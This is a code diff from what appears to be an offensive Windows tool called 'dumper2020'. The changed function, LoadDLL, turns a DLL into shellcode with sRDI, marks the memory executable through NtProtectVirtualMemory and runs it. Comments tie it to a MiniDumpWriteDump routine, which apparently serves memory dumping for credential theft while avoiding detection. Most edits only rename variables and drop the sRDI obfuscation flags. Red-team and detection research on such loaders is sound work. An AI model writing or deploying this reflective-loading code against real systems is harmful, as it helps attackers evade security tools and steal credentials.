@@ -6,19 +6,19 @@ using namespace std;
 // Function:    LoadDLL
 // Description: Perform sRDI and load specified DLL
 // Arguments:   Char array containing path to DLL
-// Called from: dumper2020!Dump
+// Called from: dumper2020!GetMiniDumpWriteDump
 // Returns:     Handle to loaded DLL for use with GetProcAddressR
 // Source:      https://github.com/monoxgas/sRDI
-HMODULE LoadDLL(const char* dllPath)
+HMODULE LoadDLL(LPSTR dllPath)
 {
     LPSTR srdiBuffer = NULL;    // Buffer that will hold the final sRDI blob
     DWORD bufferSize = 0;       // Size of the final sRDI blob
     SYSTEM_INFO sysInfo;        // System info struct
-    DWORD dwOldProtect = 0;     // Original memory page protection setting
-    HMODULE hLoadedDll = NULL;  // Handle to loaded DLL
+    DWORD oldProtect = 0;       // Original memory page protection setting
+    HMODULE dll = NULL;         // Handle to loaded DLL
 
     // Convert DLL to shellcode
-    if (!ConvertToShellcode(dllPath, NULL, NULL, NULL, SRDI_CLEARHEADER | SRDI_OBFUSCATEIMPORTS, srdiBuffer, bufferSize))
+    if (!ConvertToShellcode(dllPath, NULL, NULL, NULL, NULL, srdiBuffer, bufferSize))
         return NULL;
 
     // Page size and pointer for NtProtectVirtualMemory
@@ -27,10 +27,10 @@ HMODULE LoadDLL(const char* dllPath)
     PVOID pBuffer = srdiBuffer;
 
     // Set first page to RX to cover the sRDI boostrap at the top of the blob
-    if (NtProtectVirtualMemory(GetCurrentProcess(), &pBuffer, &pageSize, PAGE_EXECUTE_READWRITE, &dwOldProtect) == 0) {
+    if (NtProtectVirtualMemory(GetCurrentProcess(), &pBuffer, &pageSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
         // Perform sRDI and get a handle to the loaded DLL
         RDI rdi = (RDI)(srdiBuffer);
-        hLoadedDll = (HMODULE)rdi();
+        dll = (HMODULE)rdi();
     }
 
     // Free sRDI blob
@@ -38,7 +38,7 @@ HMODULE LoadDLL(const char* dllPath)
         free(srdiBuffer);
 
     // Return the handle or NULL on failure
-    return hLoadedDll;
+    return dll;
 }
 
 // Function:    ConvertToShellcode
